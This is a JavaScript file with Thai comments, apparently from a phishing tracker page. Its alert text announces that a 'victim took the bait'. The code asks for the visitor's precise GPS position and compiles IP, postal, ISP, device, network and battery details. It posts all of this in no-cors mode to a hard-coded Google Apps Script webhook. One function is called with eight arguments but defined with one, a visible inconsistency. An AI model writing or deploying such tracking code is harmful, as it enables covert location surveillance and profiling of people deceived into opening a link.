function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(position) {
        // เมื่อได้รับพิกัด
        const lat = position.coords.latitude;
        const long = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const locationData = {
          lat: lat,
          long: long,
          accuracy: accuracy,
          gmapLink: `https://www.google.com/maps?q=${lat},${long}`
        };

        // ส่งข้อมูลอีกครั้งพร้อมพิกัด
        sendToLineNotify(ipData, locationData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName);
      },
      function(error) {
        console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
        // ไม่ต้องส่งข้อมูลอีกครั้ง เพราะส่งไปแล้วในครั้งแรก
      },
      {
        timeout: 5000,
        enableHighAccuracy: true
      }
    );
  }
}

// ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด
function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName) {
  // ข้อความหลัก
  const message = [
    "🎣แจ้งเตือนเหยื่อกินเบ็ด\n",
    `⏰เวลา: ${timestamp}`,
  ];
  // เพิ่มข้อมูล Case Name (ถ้ามี)
  if (caseName && caseName !== "ไม่มีค่า") {
    message.push(`📂ชื่อเคส: ${caseName}`);
  }
  // เพิ่มข้อมูล Tracking Key (ถ้ามี)
  if (trackingKey && trackingKey !== "ไม่มีค่า") {
    message.push(`🔑Tracking Key: ${trackingKey}`);
  }
  // --- ข้อมูล IP ละเอียด ---
  message.push(`🌐IP: ${ipData.ip || "ไม่มีข้อมูล"}`);
  if (ipData.hostname && ipData.hostname !== "ไม่มีข้อมูล") {
    message.push(`   - Hostname: ${ipData.hostname}`);
  }
  if (ipData.city && ipData.country) {
    // ใช้ country code ที่ได้จาก ipinfo (e.g., TH)
    message.push(`📍ตำแหน่ง (IP): ${ipData.city}, ${ipData.region}, ${ipData.country}`);
  }
  if (ipData.loc && ipData.loc !== "ไม่มีข้อมูล") {
    message.push(`   - พิกัด (IP): ${ipData.loc}`);
  }
  if (ipData.postal && ipData.postal !== "ไม่มีข้อมูล") {
    message.push(`   - รหัสไปรษณีย์: ${ipData.postal}`);
  }
  if (ipData.org && ipData.org !== "ไม่ทราบ") {
    message.push(`🏢องค์กร/ISP: ${ipData.org}`); // แสดงข้อมูล org เต็มๆ
  } else if (ipData.isp && ipData.isp !== "ไม่ทราบ") {
    message.push(`🔌เครือข่าย: ${ipData.isp}`); // Fallback ถ้าไม่มี org
  }
  if (ipData.timezone && ipData.timezone !== "ไม่ทราบ") {
    message.push(`   - Timezone: ${ipData.timezone}`);
  }
  // --- จบข้อมูล IP ---

  // ข้อมูลพิกัด GPS (ถ้ามี)
  if (location && location !== "ไม่มีข้อมูล" && location.lat && location.long) {
    message.push(`📍พิกัด GPS: ${location.lat}, ${location.long} (แม่นยำ ±${Math.round(location.accuracy)}m)`);
    message.push(`🗺️ลิงก์แผนที่: ${location.gmapLink}`);
  } else {
    message.push(`📍พิกัด GPS: ไม่สามารถระบุได้ (ผู้ใช้ไม่อนุญาต)`);
  }

  // ข้อมูลอุปกรณ์
  message.push(`📱อุปกรณ์: ${deviceData.deviceType} - ${deviceData.deviceModel}`);
  message.push(`🌐เบราว์เซอร์: ${deviceData.browser}`);

  // ข้อมูลหน้าจอ
  message.push(`📊ขนาดหน้าจอ: ${deviceData.screenSize} (${deviceData.screenColorDepth}bit, x${deviceData.devicePixelRatio})`);

  // ข้อมูลระบบ
  message.push(`🖥️ระบบปฏิบัติการ: ${deviceData.platform}`);
  message.push(`🔤ภาษา: ${deviceData.language}`);

  // ข้อมูลการเชื่อมต่อ (เพิ่มเติม)
  if (typeof deviceData.connection === 'object') {
    // แสดงประเภทการเชื่อมต่อ (WiFi หรือ Mobile)
    const networkTypeIcon = deviceData.connection.isWifi ? "📶" : "📱";
    const networkType = deviceData.connection.networkType;
    message.push(`${networkTypeIcon}การเชื่อมต่อ: ${networkType} (${deviceData.connection.effectiveType})`);
    message.push(`⚡ความเร็วโดยประมาณ: ${deviceData.connection.downlink} Mbps (RTT: ${deviceData.connection.rtt}ms)`);

    // ถ้าเป็น Mobile ให้แสดงข้อมูลเพิ่มเติม
    if (deviceData.connection.isMobile && phoneInfo) {
      message.push(`📞เครือข่ายมือถือ: ${phoneInfo.possibleOperator}`);
      if (phoneInfo.countryCode !== "ไม่สามารถระบุได้") {
        message.push(`🏴รหัสประเทศ: ${phoneInfo.countryCode}`);
      }
      message.push(`📝หมายเหตุ: ${phoneInfo.remarks}`);
    }
  }

  // ข้อมูลแบตเตอรี่
  if (typeof deviceData.battery === 'object') {
    message.push(`🔋แบตเตอรี่: ${deviceData.battery.level} (${deviceData.battery.charging})`);
  }

  return message.join("\n");
}

// ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
function sendToLineNotify(dataToSend) {
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbydls9VdR40-hUr_2uCGz7WXubw94sXLWVjUnd9Orh5vOAuarKfwSYvYI_ZpXKMvK13gg/exec';

  // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
  if (!dataToSend.requestId) {
    dataToSend.requestId = generateUniqueId();
  }
  
  // ใช้ sessionStorage เพื่อป้องกันการส่งซ้ำในวินโดว์เดียวกัน
  const sentRequests = JSON.parse(sessionStorage.getItem('sentRequests') || '[]');
  if (sentRequests.includes(dataToSend.requestId)) {
    console.log("ข้อมูลนี้เคยส่งแล้ว (requestId: " + dataToSend.requestId + ")");
    return;
  }
  
  console.log("กำลังส่งข้อมูลไป webhook (requestId: " + dataToSend.requestId + ")");

  // ส่งข้อมูล
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(dataToSend),
    mode: 'no-cors'
  })
  .then(() => {
    console.log("ส่งข้อมูลไปยัง Server สำเร็จ");
    
    // บันทึก requestId ที่ส่งสำเร็จแล้ว
    sentRequests.push(dataToSend.requestId);
    sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
  })
  .catch(error => {
    console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
  });
}

// สร้าง unique ID สำหรับแต่ละการร้องขอ
function generateUniqueId() {
  return Date.now().toString(36) + Math.random().toString(36).substring(2, 10);
}
